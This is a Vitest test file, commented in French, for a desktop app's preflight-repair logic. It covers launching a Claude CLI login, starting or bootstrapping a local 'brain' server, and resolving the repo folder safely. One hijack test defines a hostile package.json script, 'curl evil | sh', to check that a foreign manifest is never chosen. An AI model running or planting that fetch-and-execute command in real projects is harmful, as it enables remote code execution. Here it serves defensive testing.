import { describe, expect, it, vi } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  AUTOWIN_PACKAGE_NAME,
  CLAUDE_CLI_INSTALL_COMMAND,
  planPreflightRepair,
  repairPreflightCheck,
  resolveRepoScriptCwd
} from './preflight-repair'
import { PREFLIGHT_REPAIRS } from '../renderer/src/components/preflight-repair-affordance'
import { sourceProcessPrincipal } from './source-process-principal.test-helpers'

/**
 * RÉPARER depuis la popup de diagnostic.
 *
 * Constaté en réel (2026-07-29) : la popup affichait un prérequis rouge et sa commande à recopier,
 * rien de plus. L'utilisateur devait sortir de l'app pour agir, alors que l'app sait déjà lancer le
 * login (bouton « Se reconnecter » de la page Routeur).
 */
/**
 * Aucun compte Claude dedie n'est actif dans ces tests : le plan de login RETIRE alors un
 * CLAUDE_CONFIG_DIR herite du shell parent au lieu de le subir. Sans cette purge, la console de
 * reparation authentifiait le dossier d'un AUTRE compte (incident 2026-09-01).
 */
const PURGE_HERITAGE = 'Remove-Item Env:CLAUDE_CONFIG_DIR -ErrorAction SilentlyContinue; '

describe('planPreflightRepair — on ne propose QUE ce qu’on sait réparer', () => {
  it('session Claude → login dans une console', () => {
    const plan = planPreflightRepair('claude-session')
    expect(plan?.kind).toBe('login')
    // La note doit dire que l'app ne voit aucun credential : c'est le point sensible du geste.
    expect(plan?.note).toContain('Autowin')
  })

  it('MOTEURS RETIRÉS : aucune connexion proposée pour Codex, Kimi ou Gemini', () => {
    expect(planPreflightRepair('codex-session')).toBeUndefined()
    expect(planPreflightRepair('kimi-session')).toBeUndefined()
    expect(planPreflightRepair('gemini-session')).toBeUndefined()
  })

  it('brain injoignable → démarrage local', () => {
    expect(planPreflightRepair('brain')?.kind).toBe('brain-start')
  })

  it('un SECRET ne s’invente pas → aucun bouton pour le token Brain', () => {
    expect(planPreflightRepair('brain-token')).toBeUndefined()
  })

  it('un binaire ABSENT n’est pas réparable d’un clic → aucun bouton', () => {
    expect(planPreflightRepair('codex')).toBeUndefined()
    expect(planPreflightRepair('claude')).toBeUndefined()
    expect(planPreflightRepair('kimi')).toBeUndefined()
  })

  it('un id inconnu ne produit rien (aucun faux bouton)', () => {
    expect(planPreflightRepair('n’importe quoi')).toBeUndefined()
  })
})

describe('repairPreflightCheck — ce qui est LANCÉ, jamais « réparé »', () => {
  it('MOTEUR RETIRÉ : « codex-session » n’ouvre AUCUNE console (plus de connexion Codex)', async () => {
    const openLoginTerminal = vi.fn()
    const outcome = await repairPreflightCheck('codex-session', {
      openLoginTerminal,
      resolveLoginCwd: () => '/repo/autowin'
    })
    expect(openLoginTerminal).not.toHaveBeenCalled()
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('Aucune réparation')
  })

  /**
   * DÉFAUT BLOQUANT FERMÉ (audit 2026-07-30) : le bouton lançait le NOM NU `claude auth login`,
   * résolu par le PATH du terminal, alors que la sonde de session interroge le binaire de
   * `resolveClaudeBin` (donc `CLAUDE_BIN`, puis le `claude.exe` natif du préfixe npm). Sur un poste à
   * DEUX installations aux stores d'auth distincts — cas mesuré — l'utilisateur authentifiait
   * l'installation B pendant qu'on sondait l'installation A : login réussi, check qui reste rouge,
   * aucune explication, et pour seule issue « Facultatif — ne plus demander ».
   */
  describe('session claude — on authentifie le binaire SONDÉ, pas un homonyme du PATH', () => {
    it('binaire résolu en chemin absolu → la console cible CE chemin, quoté', async () => {
      const openLoginTerminal = vi.fn()
      const bin = 'C:\\Users\\x\\AppData\\Roaming\\npm\\node_modules\\@anthropic-ai\\claude-code\\bin\\claude.exe'
      const outcome = await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => bin,
        exists: () => true
      })

      expect(openLoginTerminal).toHaveBeenCalledWith(PURGE_HERITAGE + `& "${bin}" auth login`, {})
      expect(outcome.started).toBe(true)
      expect(outcome.detail).toContain('re-vérifie')
    })

    it('un chemin à ESPACES reste une seule cible (quotes obligatoires)', async () => {
      const openLoginTerminal = vi.fn()
      await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => 'C:\\Program Files\\claude\\claude.exe',
        exists: () => true
      })

      expect(openLoginTerminal).toHaveBeenCalledWith(
        PURGE_HERITAGE + '& "C:\\Program Files\\claude\\claude.exe" auth login',
        {}
      )
    })

    it('CLAUDE_BIN qui pointe dans le vide → on REFUSE, au lieu d’ouvrir une console vouée à l’échec', async () => {
      const openLoginTerminal = vi.fn()
      const outcome = await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => 'C:\\nexiste\\pas\\claude.exe',
        exists: () => false
      })

      expect(openLoginTerminal).not.toHaveBeenCalled()
      expect(outcome.started).toBe(false)
      expect(outcome.detail).toMatch(/CLAUDE_BIN|introuvable/i)
    })

    /**
     * 2026-09-02 : le bouton rendait une commande À RECOPIER (« installe-le, puis re-vérifie ») —
     * vu de l'utilisateur, un clic sans effet. « + Ajouter un compte » du Routeur, lui, EXÉCUTE.
     * La console doit donc poser le CLI PUIS enchaîner le login, dans le même terminal.
     */
    it('CLI absent du PATH → la console INSTALLE puis enchaîne le login (pas une commande à recopier)', async () => {
      const openLoginTerminal = vi.fn()
      const outcome = await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => 'claude',
        resolveOnPath: () => null
      })

      expect(openLoginTerminal).toHaveBeenCalledTimes(1)
      const [command] = openLoginTerminal.mock.calls[0] as [string]
      expect(command).toContain(CLAUDE_CLI_INSTALL_COMMAND)
      expect(command).toContain('claude auth login')
      // L'installation passe AVANT le login : l'inverse chercherait un binaire pas encore posé.
      expect(command.indexOf(CLAUDE_CLI_INSTALL_COMMAND)).toBeLessThan(
        command.indexOf('claude auth login')
      )
      expect(outcome.started).toBe(true)
    })

    /**
     * `CLAUDE_BIN` n'est pas forcément un chemin : `CLAUDE_BIN=claude-next` désigne une seconde
     * installation par son nom. Conditionner le passage du binaire à `isAbsolute` faisait retomber ce
     * cas sur le nom nu `claude` — la divergence sonde/login rouverte, en silence.
     */
    it('CLAUDE_BIN en nom NU → la console cible CE nom, pas « claude »', async () => {
      const openLoginTerminal = vi.fn()
      const outcome = await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => 'claude-next',
        resolveOnPath: (which) => (which === 'claude-next' ? '/usr/bin/claude-next' : null)
      })

      expect(openLoginTerminal).toHaveBeenCalledWith(
        PURGE_HERITAGE + '& "claude-next" auth login',
        {}
      )
      expect(outcome.started).toBe(true)
    })

    it('CLAUDE_BIN en nom NU introuvable → refus qui NOMME CLAUDE_BIN, pas « installe le CLI »', async () => {
      const openLoginTerminal = vi.fn()
      const outcome = await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => 'claude-typo',
        // Un `claude` traîne dans le PATH : le garde-fou ne doit PAS s'en satisfaire.
        resolveOnPath: (which) => (which === 'claude' ? '/usr/bin/claude' : null)
      })

      expect(openLoginTerminal).not.toHaveBeenCalled()
      expect(outcome.started).toBe(false)
      expect(outcome.detail).toContain('claude-typo')
      expect(outcome.detail).toMatch(/CLAUDE_BIN/)
    })

    it('pas de binaire désigné mais un claude dans le PATH → repli sur le nom nu (Unix, install non-npm)', async () => {
      const openLoginTerminal = vi.fn()
      const outcome = await repairPreflightCheck('claude-session', {
        openLoginTerminal,
        resolveClaudeBin: () => 'claude',
        resolveOnPath: () => '/usr/local/bin/claude'
      })

      expect(openLoginTerminal).toHaveBeenCalledWith(PURGE_HERITAGE + 'claude auth login', {})
      expect(outcome.started).toBe(true)
    })
  })

  it('brain démarré → started, et le détail du démarrage remonte tel quel', async () => {
    const outcome = await repairPreflightCheck('brain', {
      startBrain: async () => ({ status: 'starting', detail: 'brain_server lancé (pid 42)' })
    })
    expect(outcome).toEqual({ started: true, detail: 'brain_server lancé (pid 42)' })
  })

  it('brain DÉJÀ up n’est PAS un démarrage — on ne s’attribue pas une action non faite', async () => {
    const outcome = await repairPreflightCheck('brain', {
      startBrain: async () => ({ status: 'already-up', detail: 'brain_server déjà joignable' })
    })
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('déjà joignable')
  })

  it('un check sans plan est REFUSÉ explicitement (pas un faux succès)', async () => {
    const outcome = await repairPreflightCheck('brain-token')
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('Aucune réparation')
  })

  it('repo INTROUVABLE → on n’ouvre PAS une console qui dira « Missing script »', async () => {
    const openLoginTerminal = vi.fn()
    const outcome = await repairPreflightCheck('brain-venv', {
      openLoginTerminal,
      resolveLoginCwd: () => undefined
    })
    expect(openLoginTerminal).not.toHaveBeenCalled()
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('bootstrap-deps.ps1')
  })

  it('un spawn qui jette ne casse PAS la popup — l’échec est un résultat affichable', async () => {
    const outcome = await repairPreflightCheck('brain-venv', {
      resolveLoginCwd: () => '/repo/autowin',
      openLoginTerminal: () => {
        throw new Error('cmd.exe introuvable')
      }
    })
    expect(outcome.started).toBe(false)
    expect(outcome.detail).toContain('cmd.exe introuvable')
  })
})

/**
 * Le cwd du bootstrap : `bootstrap:deps` n'existe que dans le package.json du REPO. L'app EMPAQUETÉE
 * démarre depuis n'importe où (raccourci bureau) — supposer `process.cwd()` produit « Missing script »,
 * c'est-à-dire un bouton qui ouvre une console pour rien. Chemins POSIX dans ces tests : `dirname`
 * remonte les deux séparateurs, et l'échappement Windows brouillerait la lecture.
 */
describe('resolveRepoScriptCwd — on cherche le repo, on ne le suppose pas', () => {
  const repo = join('/repo', 'autowin')
  const pkg = (dir: string): string => join(dir, 'package.json')
  // Un manifeste ne compte que s'il a l'IDENTITÉ du dépôt : `name` + le script. Le nom seul ne
  // suffit pas, le script seul non plus (cf. les tests de détournement ci-dessous).
  const manifest = (scripts: Record<string, string>, name = AUTOWIN_PACKAGE_NAME): string =>
    JSON.stringify({ name, scripts })
  const declaring = manifest({ 'bootstrap:deps': 'powershell -File scripts/bootstrap-deps.ps1' })

  it('trouve le dossier qui DECLARE le script', () => {
    expect(resolveRepoScriptCwd([repo], (p) => p === pkg(repo), () => declaring)).toBe(repo)
  })

  it('remonte les parents depuis un sous-chemin (ex. chemin de l’exe empaquete)', () => {
    const exe = join(repo, 'dist', 'win-unpacked', 'autowin-os.exe')
    expect(resolveRepoScriptCwd([exe], (p) => p === pkg(repo), () => declaring)).toBe(repo)
  })

  it('un package.json SANS le script ne compte pas (le vrai piege)', () => {
    // dist/win-unpacked/resources/app porte un package.json d’app, sans les scripts du repo.
    const packaged = join(repo, 'dist', 'win-unpacked', 'resources', 'app')
    expect(
      resolveRepoScriptCwd(
        [packaged],
        (p) => p === pkg(packaged) || p === pkg(repo),
        (p) => (p === pkg(repo) ? declaring : manifest({ start: 'x' }))
      )
    ).toBe(repo)
  })

  it('un manifeste ILLISIBLE n’interrompt pas la remontee', () => {
    const sub = join(repo, 'sub')
    expect(
      resolveRepoScriptCwd(
        [sub],
        (p) => p === pkg(sub) || p === pkg(repo),
        (p) => (p === pkg(repo) ? declaring : '{{{ pas du JSON')
      )
    ).toBe(repo)
  })

  it('le PREMIER candidat qui declare gagne (ordre respecte)', () => {
    const other = join('/autre', 'repo')
    expect(
      resolveRepoScriptCwd(
        [other, repo],
        (p) => p === pkg(other) || p === pkg(repo),
        () => declaring
      )
    ).toBe(other)
  })

  it('aucun candidat valable → undefined (et l’appelant le DIT)', () => {
    expect(resolveRepoScriptCwd(['/ailleurs'], () => false, () => '')).toBeUndefined()
    expect(resolveRepoScriptCwd([], () => true, () => declaring)).toBeUndefined()
  })

  it('candidat vide ignore (variable d’environnement non definie)', () => {
    expect(resolveRepoScriptCwd([''], () => true, () => declaring)).toBeUndefined()
  })

  /**
   * DÉTOURNEMENT — le dossier élu est ensuite exécuté (le script du repo, via
   * `powershell -ExecutionPolicy Bypass`). « Ce dossier déclare le script » n'est donc PAS une preuve
   * d'identité : la remontée des parents finit par atteindre `C:\`, dont la racine autorise par défaut
   * la création de fichiers aux utilisateurs authentifiés.
   */
  it('un package.json ÉTRANGER déclarant le script dans un parent n’est PAS élu', () => {
    const parent = '/repo'
    const hostile = manifest({ 'bootstrap:deps': 'curl evil | sh' }, 'pas-autowin')
    expect(
      resolveRepoScriptCwd([join(parent, 'ailleurs')], (p) => p === pkg(parent), () => hostile)
    ).toBeUndefined()
  })

  it('un C:\\package.json planté à la RACINE n’est jamais inspecté', () => {
    const seen: string[] = []
    expect(
      resolveRepoScriptCwd(
        ['C:\\Program Files\\Autowin OS'],
        (p) => {
          seen.push(p)
          return p === 'C:\\package.json'
        },
        () => declaring
      )
    ).toBeUndefined()
    expect(seen).not.toContain('C:\\package.json')
  })

  it('un candidat RELATIF est refusé (il se résoudrait depuis le cwd du process)', () => {
    expect(resolveRepoScriptCwd(['.'], () => true, () => declaring)).toBeUndefined()
    expect(resolveRepoScriptCwd(['sous-dossier'], () => true, () => declaring)).toBeUndefined()
  })

  it('SUR CE POSTE : le repo réel est bien élu depuis le cwd', () => {
    // Garde anti-regression : si l'identite exigee ne matche plus, le bouton « Se connecter » meurt.
    expect(resolveRepoScriptCwd([process.cwd()])).toBe(process.cwd())
  })
})

/**
 * ANTI-DIVERGENCE : le renderer duplique la liste des réparables (le main tire `node:child_process`,
 * inimportable côté renderer). Un bouton pour un check que le main refuse — ou l'inverse — est le vrai
 * risque. Il est verrouillé ici, pas laissé à la vigilance.
 */
describe('contrat — les deux listes de réparables sont identiques', () => {
  it('même ensemble d’ids, mêmes libellés, mêmes notes', () => {
    const rendererIds = Object.keys(PREFLIGHT_REPAIRS).sort()
    expect(rendererIds).toEqual(['brain', 'brain-venv', 'claude-session'])
    for (const id of rendererIds) {
      const plan = planPreflightRepair(id)
      expect(plan, `le renderer propose « ${id} » que le main refuse`).toBeDefined()
      expect(PREFLIGHT_REPAIRS[id].label).toBe(plan?.label)
      expect(PREFLIGHT_REPAIRS[id].note).toBe(plan?.note)
    }
  })

  it('aucun réparable du main n’est absent du renderer (bouton manquant)', () => {
    const allIds = [
      'brain',
      'brain-venv',
      'brain-token',
      'codex',
      'codex-session',
      'claude',
      'claude-session',
      'kimi'
    ]
    const mainRepairable = allIds.filter((id) => planPreflightRepair(id) !== undefined).sort()
    expect(Object.keys(PREFLIGHT_REPAIRS).sort()).toEqual(mainRepairable)
  })
})

describe('câblage IPC — la réparation est atteignable et gardée', () => {
  const source = (rel: string): string => readFileSync(join(__dirname, rel), 'utf8')

  it('le main garde le canal AVANT d’exécuter quoi que ce soit', () => {
    // La ZONE du process principal, pas un chemin : les canaux de prerequis ont quitte `index.ts`
    // pour `src/main/ipc/preflight.ts` le 2026-09-02 sans qu'aucun cablage ne change.
    const main = sourceProcessPrincipal()
    const start = main.indexOf("ipcMain.handle('preflight:repair'")
    expect(start).toBeGreaterThan(0)
    const suivant = main.indexOf('ipcMain.handle(', start + 1)
    const body = main.slice(start, suivant < 0 ? undefined : suivant)
    expect(body).toContain("assertTrustedRendererSender(event, 'Preflight')")
    expect(body.indexOf('assertTrustedRendererSender')).toBeLessThan(
      body.indexOf('repairPreflightCheck')
    )
    // Un id non-string ne doit jamais atteindre la réparation.
    expect(body).toContain("typeof checkId !== 'string'")
  })

  it('le preload expose le canal (sinon le bouton ne fait rien)', () => {
    expect(source('../preload/index.ts')).toContain(
      "ipcRenderer.invoke('preflight:repair', checkId)"
    )
    expect(source('../preload/index.d.ts')).toContain('repairPreflight:')
  })
})

/**
 * RUNTIME BRAIN ABSENT — le rouge que voit un collègue au tout premier lancement.
 *
 * Constaté le 2026-08-31 : l'écran affichait « brain_server injoignable » avec, en détail, « venv
 * Python introuvable ». Le seul bouton offert était « Démarrer », qui ne pouvait pas aboutir — il
 * n'y avait pas de python à lancer. Le geste utile est une INSTALLATION, et elle a son propre check.
 */
describe('réparation « runtime Brain » (brain-venv)', () => {
  it('ouvre le bootstrap dans le repo, sans élargir aux autres dépendances', async () => {
    const openLoginTerminal = vi.fn()
    const outcome = await repairPreflightCheck('brain-venv', {
      openLoginTerminal,
      cwdCandidates: ['/repo/autowin'],
      resolveLoginCwd: () => '/repo/autowin'
    })
    expect(outcome.started).toBe(true)
    expect(openLoginTerminal).toHaveBeenCalledWith(
      './scripts/bootstrap-deps.ps1 -SkipCli -SkipGraphify',
      { cwd: '/repo/autowin' }
    )
  })

  it('repo introuvable → AUCUNE console ouverte, et on dit quoi lancer', async () => {
    const openLoginTerminal = vi.fn()
    const outcome = await repairPreflightCheck('brain-venv', {
      openLoginTerminal,
      cwdCandidates: ['/ailleurs'],
      resolveLoginCwd: () => undefined
    })
    expect(outcome.started).toBe(false)
    expect(openLoginTerminal).not.toHaveBeenCalled()
    expect(outcome.detail).toContain('bootstrap-deps.ps1')
  })

  it('n’essaie JAMAIS de démarrer le brain quand c’est le runtime qui manque', async () => {
    const startBrain = vi.fn(async () => ({ status: 'starting', detail: 'lancé' }))
    await repairPreflightCheck('brain-venv', {
      openLoginTerminal: vi.fn(),
      resolveLoginCwd: () => '/repo/autowin',
      startBrain
    })
    expect(startBrain).not.toHaveBeenCalled()
  })
})
